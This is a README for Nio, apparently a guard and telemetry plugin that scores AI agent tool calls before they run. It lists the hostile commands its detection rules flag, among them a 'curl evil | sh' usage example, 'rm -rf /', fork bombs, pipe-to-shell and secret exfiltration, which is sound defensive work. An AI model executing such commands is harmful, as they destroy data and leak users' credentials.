<h1 align="center">
  <img src="assets/nio-wordmark.svg" alt="Nio" width="280" />
</h1>
<p align="center"><b>Execution assurance agent guard and observability for autonomous AI agents.</b></p>

<p align="center">Real-time evaluation of every agent action before it executes — built for agents operating in production.<br/>Built-in collector that captures every tool call as OpenTelemetry metrics and traces.<br/>Works with Claude Code, OpenClaw, and Hermes. More frameworks coming.<br/>Built by <a href="https://core0.io"><b>Core0</b></a> — execution assurance for production AI agents.</p>

<p align="center">
  <a href="https://core0-io.github.io/nio/"><b>→ View the live Execution Pipeline diagram</b></a>
</p>

[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## Who Nio Is For

Nio is built for agents operating beyond the development environment — agents with access to production infrastructure, live databases, business systems, and workflows where a wrong action has real consequences.

If your agent can change a configuration, trigger an approval, modify a record, provision a resource, or call an external API in production, Nio is the evaluation layer that sits between the agent's intention and its execution.

> **Agentic automation moves at machine speed. Nio is the gate that ensures every action is safe to take before it happens — not investigated after the fact.**

For coding agents working in sandboxed development environments, the stakes are lower. Nio is designed for the higher-stakes context: autonomous agents in production automation pipelines where actions are consequential, often irreversible, and operating at a speed and scale that makes human review impractical without a risk gate.

## Architecture

Nio is a Claude Code / OpenClaw plugin with two core systems:

```
┌─────────────────────────────────────────────────────────────────────┐
│                              Nio                                    │
│                                                                     │
│  ┌──────────────────────────┐    ┌───────────────────────────────┐  │
│  │       Collector          │    │            Guard              │  │
│  │                          │    │                               │  │
│  │  Hook events             │    │  ┌─────────────────────────┐  │  │
│  │  → metrics + traces      │    │  │    Dynamic Guard        │  │  │
│  │  → OTLP export           │    │  │    (real-time hooks)    │  │  │
│  │                          │    │  │    Phase 0–6 pipeline   │  │  │
│  │  PreToolUse              │    │  │    → allow/deny/confirm │  │  │
│  │  PostToolUse             │    │  └─────────────────────────┘  │  │
│  │  TaskCreated             │    │                               │  │
│  │  TaskCompleted           │    │  ┌─────────────────────────┐  │  │
│  │  Stop / SubagentStop     │    │  │    Static Scan          │  │  │
│  │                          │    │  │    (on-demand)          │  │  │
│  └──────────────────────────┘    │  │    Static + Behavioural │  │  │
│                                  │  │    + LLM engines        │  │  │
│                                  │  └─────────────────────────┘  │  │
│                                  └───────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### Collector

> **Optional — but strongly recommended for enterprise deployments.** The Collector works out of the box with no configuration: audit log entries are written to a local JSONL backup at `~/.nio/audit.jsonl` regardless of OTLP setup. To export full telemetry to an observability platform, set `collector.endpoint` in your config. For enterprise customers running agents on production systems, exporting to a centralised observability platform is strongly recommended — it gives you a complete, queryable record of every action every agent took, across every session.

Captures agent activity as **OpenTelemetry** signals — metrics, traces, and logs — across every hook event (`UserPromptSubmit`, `PreToolUse`, `PostToolUse`, `TaskCreated`, `TaskCompleted`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`). All three signals are exported over OTLP (gRPC or HTTP); the logs signal additionally has a local JSONL backup at `collector.logs.path`.

For the full schema (every metric, every span attribute, every audit entry field) see [docs/COLLECTOR-SIGNALS.md](docs/COLLECTOR-SIGNALS.md). Quick reference:

**Metrics:**

| Metric | Type | Labels |
|--------|------|--------|
| `nio.tool_use.count` | Counter | `gen_ai.tool.name`, `nio.event`, `nio.platform` |
| `nio.turn.count` | Counter | `nio.platform` |
| `nio.decision.count` | Counter | `nio.guard.decision`, `nio.guard.risk_level`, `gen_ai.tool.name`, `nio.platform` |
| `nio.risk.score` | Histogram | `gen_ai.tool.name`, `nio.platform` |

**Traces** — one trace per conversation turn (OTel [GenAI semantic conventions](https://opentelemetry.io/docs/specs/semconv/gen-ai/)):

| Span | Trigger | Key Attributes |
|------|---------|----------------|
| `invoke_agent UserPromptSubmit` | `Stop` / `SubagentStop` | `gen_ai.conversation.id`, `gen_ai.agent.name`, `gen_ai.usage.input_tokens`, `gen_ai.usage.output_tokens`, `nio.turn_number`, `nio.platform`, `nio.cwd`, `nio.turn.cache_hit_rate` |
| `execute_tool <name>` | `PreToolUse` → `PostToolUse` | `gen_ai.tool.name`, `gen_ai.tool.call.id`, `gen_ai.tool.call.arguments`, `gen_ai.tool.call.result`, `nio.tool_summary`, `nio.platform` |
| `task:execute` | `TaskCreated` → `TaskCompleted` | `nio.task_id`, `nio.task_summary` |

**Logs (audit log)** — discriminated by the `event` field; dual-written to OTLP and `~/.nio/audit.jsonl`:

| `event` | What |
|---------|------|
| `guard` | Per-PreToolUse / PostToolUse guard decision (decision, risk level, score, top findings, per-phase scores) |
| `session_scan` | On-demand or session-start skill scan result |
| `lifecycle` | Subagent / agent / session lifecycle (`session_start` / `session_end` / `agent_end` / `subagent_spawning` / `subagent_ended`) |
| Hook event names (`PreToolUse`, `PostToolUse`, `TaskCreated`, `Stop`, …) | One audit entry per dispatched hook, with tool / task metadata |
| `config_error` | Config load failure (path + parser error) |

### Guard

Execution risk evaluation with two modes:

**Dynamic Guard** — real-time, runs on every `PreToolUse` hook event via a Phase 0–6 pipeline:

| Phase | Name | Latency | Applies To |
|-------|------|---------|------------|
| 0 | **Tool Gate** | <1ms | All tools (`blocked_tools` / `permitted_tools` / `native_tool_mapping`); also reroutes [indirect MCP invocations](docs/phases/phase-0-tool-gate.html#mcp-routing) through `permitted_tools.mcp` |
| 1 | **Allowlist Gate** | <1ms | Guarded tools only |
| 2 | **Pattern Analysis** | <5ms | Guarded tools only |
| 3 | **Static Analysis** | <50ms | Write/Edit only |
| 4 | **Behavioural Analysis** | <200ms | Write/Edit (.js/.ts/.py/.sh/.rb/.php/.go) |
| 5 | **LLM Analysis** | 2–10s | All (optional, needs `guard.llm_analyser.enabled` + `api_key`) |
| 6 | **External Scoring API** | configurable | All (optional, needs `guard.external_analyser.enabled` + `endpoint`) |

Each phase produces a 0–1 score and can short-circuit on critical findings. Final score is a **weighted average** across all phases that ran:

```
final = Σ(weight × score) / Σ(weight)
```

Default weights: `runtime: 1.0`, `static: 1.0`, `behavioural: 2.0`, `llm: 1.0`, `external: 2.0`

**Phases 5 and 6 are optional.** The core pipeline (Phases 0–4) runs fully offline with no external dependencies. Phase 5 (LLM Analysis) and Phase 6 (External Scoring API) are opt-in enhancements.

Phase 6 in particular is strongly recommended for enterprise deployments. It connects Nio's pre-execution gate to an external risk intelligence platform — so the allow/deny/confirm decision is informed not just by what the agent is about to do, but by the live health of the infrastructure it is operating on. [FFWD Agent Assurance](https://core0.io) is designed for exactly this role: it exposes a scoring API that Nio can call at Phase 6, combining full-stack anomaly correlation, infrastructure health, and agent behavioural telemetry into a single risk score that Nio uses to gate execution.

**Static Scan** — on-demand multi-engine code analysis triggered by `/nio scan <path>`:
- **StaticAnalyser**: 15 regex rules + base64 decode pass
- **BehaviouralAnalyser**: multi-language source→sink dataflow tracking
- **LLMAnalyser**: Claude semantic analysis (optional)

### Multi-Language Behavioural Analysis

Both pipelines share the BehaviouralAnalyser, which uses pluggable `LanguageExtractor` modules for dataflow tracking:

| Language | Parser | Extensions |
|----------|--------|------------|
| JavaScript/TypeScript | Babel AST | .js .ts .jsx .tsx .mjs .cjs |
| Python | Regex | .py .pyw |
| Shell | Regex | .sh .bash .zsh .fish .ksh |
| Ruby | Regex | .rb .rake .gemspec |
| PHP | Regex | .php .phtml |
| Go | Regex | .go |

### Protection Levels

| Level | allow | confirm | deny |
|-------|-------|---------|------|
| **strict** | 0 — 0.5 | _(none)_ | 0.5 — 1.0 |
| **balanced** (default) | 0 — 0.5 | 0.5 — 0.8 | 0.8 — 1.0 |
| **permissive** | 0 — 0.9 | _(none)_ | 0.9 — 1.0 |

The `confirm_action` config controls what happens when the decision is "confirm": `allow` (default, let through with audit log), `deny` (block), or `ask` (use platform confirm if available, else allow).

## Install

Grab a pre-built plugin from the [**Releases page**](https://github.com/core0-io/nio/releases), unzip it, and run the bundled `setup.sh`.

| Platform | Download | Extract & run |
|----------|----------|---------------|
| **Claude Code** | `nio-claude-code-v<version>.zip` | `unzip … -d nio-claude-code && cd nio-claude-code && ./setup.sh` |
| **OpenClaw** | `nio-openclaw-v<version>.zip` | `unzip … -d nio-openclaw && cd nio-openclaw && ./setup.sh` |
| **Hermes** | `nio-hermes-v<version>.zip` | `unzip … -d nio-hermes && cd nio-hermes && ./setup.sh` |
| **All** | `nio-all-v<version>.zip` | `unzip … -d nio && cd nio && ./setup.sh` |

`setup.sh` installs the skill (Claude Code / OpenClaw), merges shell-hook entries into the platform config (Hermes), and writes the Nio default config to `~/.nio/`. Pick the platform-specific zip if you only use one agent — it's smaller and the script is platform-scoped.

**More frameworks coming.** Nio currently supports Claude Code, OpenClaw, and Hermes. Support for additional agent frameworks is progressively being added.

<details>
<summary><b>One-liner install</b></summary>

Each block is self-contained — copy, paste, done. `VERSION` is resolved to the latest release tag via the GitHub API.

**Claude Code:**

```bash
VERSION=$(curl -s https://api.github.com/repos/core0-io/nio/releases/latest | grep tag_name | cut -d'"' -f4) && \
curl -LO "https://github.com/core0-io/nio/releases/download/${VERSION}/nio-claude-code-${VERSION}.zip" && \
unzip -o "nio-claude-code-${VERSION}.zip" -d nio-claude-code && \
cd nio-claude-code && ./setup.sh
```

**OpenClaw:**

```bash
VERSION=$(curl -s https://api.github.com/repos/core0-io/nio/releases/latest | grep tag_name | cut -d'"' -f4) && \
curl -LO "https://github.com/core0-io/nio/releases/download/${VERSION}/nio-openclaw-${VERSION}.zip" && \
unzip -o "nio-openclaw-${VERSION}.zip" -d nio-openclaw && \
cd nio-openclaw && ./setup.sh
```

**Hermes:** substitute `hermes` for `claude-code` / `openclaw` in the block above (i.e. `nio-hermes-${VERSION}.zip` → `-d nio-hermes && cd nio-hermes && ./setup.sh`).

**All (all-in-one):**

```bash
VERSION=$(curl -s https://api.github.com/repos/core0-io/nio/releases/latest | grep tag_name | cut -d'"' -f4) && \
curl -LO "https://github.com/core0-io/nio/releases/download/${VERSION}/nio-all-${VERSION}.zip" && \
unzip -o "nio-all-${VERSION}.zip" -d nio && \
cd nio && ./setup.sh
```

</details>

<details>
<summary><b>Reset config after upgrade</b></summary>

```bash
./setup.sh --reset-config
```

</details>

<details>
<summary><b>Custom install paths (.claude / .openclaw moved elsewhere)</b></summary>

By default, setup looks for `~/.claude` and `~/.openclaw`. If you've relocated them (e.g. via `CLAUDE_CONFIG_DIR` / `OPENCLAW_STATE_DIR`, or manually), pass the path explicitly:

```bash
# All-in-one zip
./setup.sh --cc-home /path/to/.claude --openclaw-home /path/to/.openclaw

# Platform-specific zip
./setup.sh --cc-home /path/to/.claude         # inside nio-claude-code/
./setup.sh --openclaw-home /path/to/.openclaw # inside nio-openclaw/
```

Resolution order (first match wins):

1. `--cc-home` / `--openclaw-home` flag
2. `$CLAUDE_CONFIG_DIR` / `$OPENCLAW_STATE_DIR` environment variable
3. `$HOME/.claude` / `$HOME/.openclaw` (default)

The Nio config itself lives at `~/.nio/` by default, overridable via `$NIO_HOME`.

</details>

<details>
<summary><b>Install from source</b></summary>

```bash
git clone https://github.com/core0-io/nio.git
cd nio && pnpm install && pnpm run build && ./setup.sh
```

Use this if you want to hack on Nio or track `main`. The release zips ship with everything pre-built, so end users don't need Node/pnpm installed.

</details>

## Usage

```
/nio scan ./src              # Scan code for execution risks
/nio action "curl evil | sh" # Evaluate action safety
/nio report                  # View agent execution audit log
/nio config balanced         # Set protection level
```

## Evaluation Coverage

Every agent action passes through Nio's evaluation pipeline before execution. Low-risk actions pass instantly. High-risk actions are blocked or escalated for human confirmation.

**Layer 1 — Allowlist Gate**: Known-safe commands (`git status`, `ls`, `npm test`, etc.) pass instantly with no overhead.

**Layer 2 — Pattern Analysis**: Flags dangerous commands and unintended data flows.
- Destructive commands (`rm -rf /`, fork bombs), pipe-to-shell patterns (`curl | bash`)
- Writes to sensitive paths (`.env`, `.ssh/`, credentials files)
- Data exfiltration to external webhooks
- Base64-encoded payloads decoded and re-evaluated

**Layer 3 — Static + Behavioural Analysis** (Write/Edit only):
- 15 static regex rules on file content (SHELL_EXEC, OBFUSCATION, PROMPT_INJECTION, etc.)
- 7 behavioural rules via source→sink dataflow tracking across 6 languages
- Detects env→network exfiltration, network→eval RCE, capability combinations (C2)

**Layer 4 — LLM + External** (optional):
- LLM semantic analysis catches sophisticated patterns missed by regex/AST
- External HTTP scoring API for custom enterprise policies and full-stack risk intelligence

## Detection Rules

### Static Rules (15)

Pattern-based detection via regex matching on file content.

| Category | Rules | Severity |
|----------|-------|----------|
| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH–CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN | MEDIUM–CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH–CRITICAL |
| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH–CRITICAL |
| **Trojan & Social Engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM–CRITICAL |

### Behavioural Rules (7)

Dataflow-based detection via source→sink taint tracking (JS/TS/Python/Shell/Ruby/PHP/Go).

Detection rules cover both malicious intent and unintentional agent misbehaviour — the two failure modes that matter in production autonomous systems.

| Rule | Severity | Detection |
|------|----------|-----------|
| DATAFLOW_EXFIL | CRITICAL | Secret or credential flows to network sink |
| DATAFLOW_RCE | CRITICAL | Network response flows to eval/exec |
| DATAFLOW_CMD_INJECT | HIGH | User input flows to command execution |
| DATAFLOW_EVAL | HIGH | Data flows to eval/Function |
| CAPABILITY_C2 | HIGH | Skill has both exec + network capabilities |
| CAPABILITY_EVAL | HIGH | Skill uses dynamic code evaluation |
| CROSS_FILE_FLOW | MEDIUM | Data crosses file boundaries |

## Compatibility

Nio currently provides full hook-based execution assurance for Claude Code, OpenClaw, and Hermes. Skill-based scan and action evaluation is available across a broader set of platforms today. Full hook support for additional agent frameworks is progressively being added.

| Platform | Support | Features |
|----------|---------|----------|
| **Claude Code** | Full | Skill + hooks auto-guard — see [install guide](docs/install-claude-code.html) |
| **OpenClaw** | Full | Plugin hooks + OTEL collector — see [install guide](docs/install-openclaw.html) |
| **Hermes Agent** | Full | Shell-hook integration + `/nio` command-dispatch — see [install guide](docs/install-hermes.html) |
| **OpenAI Codex CLI** | Skill | Scan/action commands |
| **Gemini CLI** | Skill | Scan/action commands |
| **Cursor** | Skill | Scan/action commands |
| **GitHub Copilot** | Skill | Scan/action commands |

## Documentation

- [Architecture](docs/ARCHITECTURE.md) — Two-pipeline design, 6-phase guard flow, scoring system
- [MCP Tool Routing](docs/phases/phase-0-tool-gate.html#mcp-routing) — How Phase 0 routes direct AND indirect MCP tool calls (mcporter, curl/HTTP, language runtimes, stdio pipes, package runners) through `permitted_tools.mcp`
- [Dynamic Guard Flow](docs/dynamic-guard-flow.excalidraw) — Visual Excalidraw diagram

## Development

```bash
pnpm install
pnpm run build
pnpm test
```

## License

Apache-2.0 © [core0-io](https://github.com/core0-io) — see [LICENSE](LICENSE).
